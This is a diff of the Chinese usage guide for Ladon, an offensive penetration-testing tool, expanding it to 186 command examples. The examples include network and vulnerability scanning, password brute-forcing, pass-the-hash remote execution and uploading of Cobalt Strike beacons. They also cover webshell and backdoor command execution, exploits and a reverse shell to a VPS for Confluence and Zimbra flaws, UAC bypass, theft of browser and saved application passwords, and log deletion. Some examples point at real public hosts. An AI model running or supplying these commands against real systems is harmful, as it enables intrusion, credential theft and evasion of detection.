@@ -1,18 +1,20 @@
 Ladon 简明使用教程 完整文档: http://k8gege.org/Ladon 
-支持Cmd、Shell、Cobalt Strike、PowerShell下使用
+支持Cmd、Cobalt Strike、PowerShell等内存加载
 Windows版本: .Net、Cobalt Strike、PowerShell
 全系统版本：GO(全平台)、Python(理论上全平台)
-PS: GUI版主要方便本地测试使用，完整功能使用CMD
+PS: Study方便本地测试使用，完整功能请使用CMD
 
 ### 版本
-Ladon9.1.4 20220318
-简明用法例子 150例
+Ladon 10.1 20221220
+简明用法例子 186例
 
 ### 001 自定义线程扫描
 例子：扫描目标10.1.2段是否存在MS17010漏洞
 单线程：Ladon 10.1.2.8/24 MS17010 t=1
 80线程：Ladon noping 10.1.2.8/24 MS17010 t=80
-在高强度防护下的网络默认线程无法扫描，必须单线程
+
+高强度防护下扫描线程设置低一些，单线程或F单线程最佳
+单线程：Ladon 10.1.2.8/24 MS17010 f=1
 
 ### 002 Socks5代理扫描
 例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）
@@ -50,8 +52,19 @@ Ladon domain.txt ICMP
 ##### 008 ICMP批量扫描机器是否存活
 Ladon host.txt ICMP
 
-##### 009 批量识别URL列表CMS
-Ladon url.txt WhatCMS
+##### 009 WhatCMS批量识别URL列表CMS识别、Banner、SSL证书、标题
+Ladon 192.168.1.8 WhatCMS   扫描IP
+Ladon 192.168.1.8/24 WhatCMS   扫描C段
+Ladon 192.168.1.8/C WhatCMS   扫描C段
+Ladon 192.168.1.8/B WhatCMS   扫描B段
+Ladon 192.168.1.8/A WhatCMS   扫描A段
+Ladon IP.TXT WhatCMS   扫描IP列表
+Ladon IP24.TXT WhatCMS   扫描C段列表
+Ladon IP16.TXT WhatCMS   扫描B段列表
+Ladon cidr.TXT WhatCMS   扫描整个国家IP段列表
+禁PING扫描
+Ladon noping 192.168.1.8 WhatCMS   扫描IP
+Ladon noping 192.168.1.8/24 WhatCMS   扫描C段
 
 ##### 010 批量检测DrayTek路由器版本、漏洞、弱口令
 Ladon url.txt DraytekPoc
@@ -105,6 +118,14 @@ Ladon baidu.com SubDomain
 Ladon baidu.com DomainIP
 Ladon baidu.com HostIP
 
+##### 025 批量域名解析IP、批量主机名解析IP
+Ladon domain.txt DomainIP
+Ladon host.txt HostIP
+
+##### 025 批量域名、主机名解析 结果只有IP
+Ladon domain.txt Domain2IP
+Ladon host.txt Host2IP
+
 ##### 026 DNS查询域内机器、IP (条件域内)
 Ladon AdiDnsDump 192.168.1.8 (Domain IP)
 
@@ -119,8 +140,8 @@ Ladon 192.168.1.8 PortScan 80,445,3389
 Ladon 192.168.1.8/24 WhatCMS
 
 ##### 030 扫描思科设备
-Ladon 192.168.1.8/24 CiscoScan
-Ladon http://192.168.1.8 CiscoScan
+Ladon 192.168.1.8/24 CiscoInfo
+Ladon http://192.168.1.8 CiscoInfo
 
 ##### 031 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本）
 Ladon EnumMssql
@@ -131,7 +152,7 @@ Ladon EnumShare
 ##### 033 扫描LDAP服务器(探测域控)
 Ladon 192.168.1.8/24 LdapScan
 
-##### 034 扫描FTP服务器
+##### 034 扫描FTP服务器并识别版本
 Ladon 192.168.1.8/24 FtpScan
 
 ### 暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆
@@ -148,7 +169,7 @@ Ladon 192.168.1.8/24 WmiScan
 Ladon 192.168.1.8/24 LdapScan
 
 ##### 038 5985端口 Winrm密码爆破(Windowns)
-Ladon 192.168.1.8/24 WinrmScan.ini
+Ladon 192.168.1.8/24 WinrmScan
 
 ##### 039 445端口 SMB NTLM HASH爆破(Windows)
 Ladon 192.168.1.8/24 SmbHashScan
@@ -260,7 +281,8 @@ Ladon ForExec "CVE-2020-0796-Exp -i 192.168.1.8 -p 445 -e --load-shellcode test.
 
 ### 文件下载、文件传输
 
-##### 071 HTTP下载
+##### 071 HTTP下载 HTTPS下载 MSF下载
+Ladon wget https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe
 Ladon HttpDownLoad http://k8gege.org/Download/Ladon.rar
 
 ##### 072 Ftp下载 	
@@ -368,7 +390,7 @@ Ladon RdpLog
 
 ##### 099 445端口 加密PSEXEC远程执行命令（交互式）
 
-net user \\192.168.1.8 k8gege520 /user:k8gege
+net use \\192.168.1.8 k8gege520 /user:k8gege
 Ladon psexec 192.168.1.8
 psexec> whoami
 nt authority\system
@@ -379,34 +401,37 @@ Ladon wmiexec 192.168.1.8 k8gege k8gege520 cmd whoami  (8.2后用法)
 Ladon wmiexec 192.168.1.8 k8gege k8gege520 b64cmd d2hvYW1p  (8.2后用法)
 
 ##### 101 445端口 AtExec远程执行命令（非交互式）
-Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami
+Ladon AtExec 192.168.1.8 k8gege k8gege520 whoami
 
 ##### 102 22端口 SshExec远程执行命令（非交互式）
 Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami
 Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami
 
-##### 103 JspShell远程执行命令（非交互式）
+##### 103 JspShell远程执行命令（非交互式）9.3.0移除
 Usage：Ladon JspShell type url pwd cmd
 Example: Ladon JspShell ua http://192.168.1.8/shell.jsp Ladon whoami
 
-##### 104 WebShell远程执行命令（非交互式）
+##### 104 WebShell远程执行命令（非交互式）9.3.0移除
 ```Bash
 Usage：Ladon WebShell ScriptType ShellType url pwd cmd
 Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami
 Example: Ladon WebShell aspx cd http://192.168.1.8/1.aspx Ladon whoami
 Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami
+Example: Ladon WebShell jsp 5 http://192.168.1.8/123.jsp Ladon whoami
+获取系统版本信息 方便提权
+Example: Ladon WebShell jsp 5 http://192.168.1.8/123.jsp Ladon OSinfo
 ```
 
-##### 105 135端口 WmiExec2远程执行命令 （非交互式）支持文件上传
+##### 105 135端口 WmiExec2远程执行命令支持HASH （非交互式）支持文件上传
 Usage:
 Ladon WmiExec2 host user pass cmd whoami
-Ladon WmiExec2 pth host cmd whoami
+Ladon WmiExec2 pth host cmd whoami		 先Mimikatz注入Hash，再pth执行命令
 Base64Cmd for Cobalt Strike
 Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA
 Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA
 Upload:
 Ladon WmiExec2 host user pass upload beacon.exe ceacon.exe
-Ladon WmiExec2 pth host upload beacon.exe ceacon.exe
+Ladon WmiExec2 pth host upload beacon.exe ceacon.exe  先Mimikatz注入Hash，再pth执行命令
 
 ##### 106 445端口 SmbExec Ntlm-Hash非交互式远程执行命令(无回显)
 Ladon SmbExec 192.168.1.8 k8gege k8gege520 cmd whoami  
@@ -453,7 +478,7 @@ Ladon GetSystem cmd.exe explorer
 Ladon Runas user pass cmd
 
 ##### 116 MS16135提权至SYSTEM
-Ladon ms16135 whoami
+Ladon ms16135 whoami   >=9.2.1版本移除
 
 ##### 117 BadPotato服务用户提权至SYSTEM	
 Ladon BadPotato cmdline
@@ -526,7 +551,7 @@ Ladon sc c:\123.exe auto ServerName
 ### 系统信息探测
 
 ##### 136  Snmp协议探测操作系统、设备等信息
-Ladon 192.168.1.8/24 SnmpScan 
+Ladon 192.168.1.8/24 SnmpInfo
 
 ##### 137  Nbt协议探测Windows主机名、域、用户
 Ladon 192.168.1.8/24 NbtInfo
@@ -584,3 +609,173 @@ Ladon LogDelTomcat access.log 192.168.1.8
 Ladon 192.168.1.8/24 Poc.exe
 Ladon 192.168.1.8/24 *.dll(c#)
 
+##### 151 ReadFile 读取大文件前面指定长度内容
+Ladon ReadFile c:\k8.exe 默认1k
+Ladon ReadFile c:\k8.exe 1K
+Ladon ReadFile c:\k8.exe 1024K
+Ladon ReadFile c:\k8.exe 1M
+
+##### 152 修改注册表读取2012及后系统明文密码
+Ladon SetMzLogonPwd 1
+
+##### 153 修改注册表劫持签名签证
+Ladon SetSignAuth 1 
+
+##### 154 IP24 批量IP转成ip24格式(192.168.1.1/24)
+Ladon ip.txt IP24
+
+##### 155 IPC  批量IP转成ip C格式(192.168.1.)
+Ladon ip.txt IPC
+
+##### 156 IPB  批量IP转成ip B格式(192.168.)
+Ladon ip.txt IPB
+
+##### 157 漏洞检测Atlassian Confluence CVE-2022-26134
+Ladon url.txt CVE-2022-26134
+
+##### 158 Atlassian Confluence CVE-2022-26134 EXP
+Ladon EXP-2022-26134 https://111.229.255.81 id
+
+##### 159 RevShell-2022-26134  CVE-2022-26134反弹Shell
+Ladon RevShell-2022-26134 TargetURL VpsIP VpsPort
+Ladon RevShell-2022-26134 http://xxx.com:8090 123.123.123.123 4444
+
+##### 160 SslInfo 证书探测设备、IP、域名、机器名、组织机构等信息
+Ladon https://k8gege.org SslInfo
+Ladon k8gege.org SslInfo
+Ladon k8gege.org:443 SslInfo 指定端口
+Ladon noping fbi.gov SslInfo 禁ping探测
+Ladon 192.168.1.1 SslInfo
+Ladon 192.168.1.1:8443 SslInfo
+
+##### 161 SslInfo 证书批量探测设备、IP、域名、机器名、组织机构等信息
+Ladon ip.txt SslInfo
+Ladon url.txt SslInfo
+Ladon 192.168.1.1/c SslInfo
+Ladon 192.168.1.1/b SslInfo
+
+##### 162 WPinfo 多种方法获取WordPress主程序、主题、插件版本
+Ladon https://k8gege.org WPinfo
+Ladon k8gege.org WPinfo
+Ladon noping fbi.gov WPinfo 禁ping探测
+Ladon 192.168.1.1 WPinfo
+Ladon 192.168.1.1:8443 WPinfo
+
+##### 163 WPinfo 批量获取WordPress主程序、主题、插件版本
+Ladon ip.txt WPinfo
+Ladon url.txt WPinfo
+Ladon 192.168.1.1/c WPinfo
+Ladon 192.168.1.1/b WPinfo
+
+##### 164  Exchange暴力破解 识别Exchange密码爆破
+Ladon k8gege.org ExchangeScan
+Ladon 192.168.1.8 ExchangeScan
+Ladon 192.168.1.8、24 ExchangeScan
+
+##### 165 CVE-2022-27925 批量探测Zimbra邮服ZIP目录穿越RCE漏洞
+Ladon 192.168.1.8 CVE-2022-27925
+Ladon http://zimbra.k8gege.org CVE-2022-27925
+Ladon ip.txt CVE-2022-27925
+Ladon url.txt CVE-2022-27925
+Ladon 192.168.1.1/c CVE-2022-27925
+Ladon 192.168.1.1/b CVE-2022-27925
+
+##### 166 EXP-2022-27925 Zimbra邮服未授权RCE漏洞EXP GetShell
+Ladon EXP-2022-27925 https://zimbra.k8gege.org poc.zip
+
+##### 167 WebShellCmd 连接jsp WebShell(支持cd、k8、ua、uab64)
+Ladon WebShell jsp ua https://zimbra.k8gege.org pass whoami
+
+##### JSP UAshell 查看系统版本、python、gcc等信息方便提权
+Ladon WebShell jsp ua https://zimbra.k8gege.org pass OSinfo
+
+##### 168 WebShellCmd 连接jsp WebShell(支持cd、k8、ua、uab64)
+Ladon WebShell jsp uab64 https://zimbra.k8gege.org pass whoami
+
+##### 169 非交互式连接IIS-Raid后门执行命令
+Ladon IISdoor http://192.168.1.142 whoami
+Ladon IISdoor http://192.168.1.142 SIMPLEPASS whoami
+
+##### 170 FindIP匹配IP段是否出现在漏洞结果中
+Ladon FindIP ipc.txt ISVUL.txt		 (精确搜索)
+Ladon FindIP ipc.txt ISVUL.txt like  (模糊搜索)
+
+##### 171 CiscoDump CVE-2019-1653 Cisco RV320 RV325 Dump Password
+Ladon https://192.168.1.8 CiscoDump
+Ladon url.txt CiscoDump 批量探测Cisco漏洞并导出用户密码
+
+##### 172 PrinterPoc  打印机PJL任意代码执行漏洞批量检测
+Ladon 192.168.1.8 PrinterPoc
+Ladon ip.txt PrinterPoc
+禁ping机器扫描使用noping
+Ladon noping 192.168.1.8 PrinterPoc
+Ladon noping ip.txt PrinterPoc
+
+##### 173 通过Mac查询制造商(Ladon Mac MAC地址)
+Ladon Mac ff-ff-ff-ff-ff-ff
+Ladon Mac 01:00:5e:00:00:16
+Ladon Mac ff5e00885d66
+
+##### 174 Cisco VPN路由器密码爆破(内置默认密码，支持明文、Hash)
+Ladon 192.168.1.8/24 CiscoScan
+Ladon https://192.168.1.8 CiscoScan
+Ladon ip.txt CiscoScan
+Ladon url.txt CiscoScan​
+
+##### 175 vsFTPdPoc	CVE-2011-2523 vsftpd 2.3.4 笑脸后门漏洞检测
+Ladon noping ip CVE-2011-2523
+Ladon noping ip.txt vsFTPdPoc  
+
+##### 176 WpScan WordPress密码审计、弱口令
+Ladon http://192.168.1.8 WpScan
+Ladon url.txt WpScan
+Ladon 192.168.1.8/24 WpScan http  扫描IP时添加http://
+
+##### 177  探测Exchange版本不会触发WAF
+Ladon 192.168.1.8/24 ExchangeVer
+
+##### 178  Exchange高危RCE漏洞检测
+Ladon https://192.168.1.8 ExchangePoc
+
+##### 179 Http/S获取网页返回头信息
+Ladon https://192.168.1.8 GetHead
+Ladon ip.txt GetHead
+Ladon 192.168.1.8/24 GetHead http  扫描IP时添加http://
+Ladon ip.txt GetHead https		   扫描IP时添加https://
+
+##### 180 Http/S获取网页返回头信息+源码
+Ladon https://192.168.1.8 GetHtml
+Ladon ip.txt GetHtml
+Ladon 192.168.1.8/24 GetHtml http
+Ladon ip.txt GetHtml https		   扫描IP时添加https://
+
+##### 181 Http/S获取网页中的域名
+Ladon https://192.168.1.8 GetDomain
+Ladon ip.txt GetDomain
+Ladon 192.168.1.8/24 GetDomain http
+Ladon ip.txt GetDomain https		   扫描IP时添加https://
+
+##### 182 TrueIP获取域名真实IP(可用域名、标题、Banner等唯一关键字特征)
+Ladon ip.txt TrueIP k8gege.org
+Ladon 192.168.1.8/24 TrueIP k8gege.org
+Ladon ip.txt TrueIP "K8哥哥"
+Ladon 192.168.1.8/24 TrueIP "K8哥哥"
+
+##### 183 Firefox密码\Cookie\历史记录读取
+Ladon FirefoxPwd
+Ladon FirefoxHistory
+Ladon FirefoxCookie
+
+##### 184  BypassUAC11无回显支持Win7、Win8、Win11 Win2012\2016\2019等
+Ladon40 BypassUAC11 cmd
+Ladon40 BypassUAC11 c:\1.bat
+Ladon40 BypassUAC11 c:\1.exe
+
+##### 185 GetPwd支持Navicat、TeamView、Xshell、SecureCRT密码获取
+Ladon GetPwd	   
+
+##### 186 DraytekScan 密码审计Draytek弱口令检测
+Ladon 192.168.1.8 DraytekScan
+Ladon https://192.168.1.8 DraytekScan
+Ladon 192.168.1.8/24 DraytekScan
+Ladon url.txt DraytekScan
